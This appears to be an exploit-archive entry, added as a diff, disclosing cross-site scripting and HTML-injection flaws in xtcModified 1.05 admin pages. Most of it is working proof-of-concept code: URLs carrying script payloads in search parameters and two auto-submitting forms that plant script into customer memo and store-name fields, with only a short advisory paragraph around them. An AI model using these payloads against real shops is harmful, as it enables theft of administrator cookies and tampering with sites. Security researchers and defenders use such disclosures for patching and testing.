@@ -1,0 +1,56 @@
+source: http://www.securityfocus.com/bid/46681/info
+
+xtcModified is prone to multiple cross-site scripting and HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+xtcModified 1.05 is vulnerable; other versions may also be affected. 
+
+Cross-site scripting:
+
+http://www.example/admin/categories.php?search=prod"><script>alert(document.cookie)</script>
+http://www.example/admin/orders.php?selected_box=customers"><script>alert(document.cookie)</script>&status=0
+
+Html-injection:
+
+1. 
+
+<form action="http://www.example/admin/customers.php?cID=1&action=update" method="post" name="main">
+
+<input type="hidden" name="default_address_id" value="1">
+<input type="hidden" name="customers_gender" value="m">
+<input type="hidden" name="csID" value="">
+<input type="hidden" name="customers_firstname" value="FirstName">
+<input type="hidden" name="customers_lastname" value="LName">
+<input type="hidden" name="customers_dob" value="01/01/2007">
+<input type="hidden" name="customers_email_address" value="email@example.com">
+<input type="hidden" name="entry_company" value="company">
+<input type="hidden" name="entry_password" value="mypass">
+<input type="hidden" name="memo_title" value=&#039;mmtitle"><script>alert(document.cookie)</script>&#039;>
+<input type="hidden" name="memo_text" value=&#039;txt"><script>alert(document.cookie)</script>&#039;>
+
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+2. 
+
+<form action="http://www.example/admin/configuration.php?gID=1&action=save" method="post" name="main">
+
+<input type="hidden" name="STORE_NAME" value=&#039;My Store"><script>alert(document.cookie)</script>&#039;>
+<input type="hidden" name="STORE_OWNER" value="Owner">
+<input type="hidden" name="STORE_OWNER_EMAIL_ADDRESS" value="email@example.com">
+<input type="hidden" name="STORE_COUNTRY" value="81">
+<input type="hidden" name="STORE_ZONE" value="80">
+<input type="hidden" name="EXPECTED_PRODUCTS_SORT" value="desc">
+<input type="hidden" name="EXPECTED_PRODUCTS_FIELD" value="date_expected">
+<input type="hidden" name="DISPLAY_CART" value="true">
+<input type="hidden" name="ADVANCED_SEARCH_DEFAULT_OPERATOR" value="and">
+<input type="hidden" name="STORE_NAME_ADDRESS" value="address">
+<input type="hidden" name="CURRENT_TEMPLATE" value="xtc5">
+</form>
+<script>
+document.main.submit();
+</script>
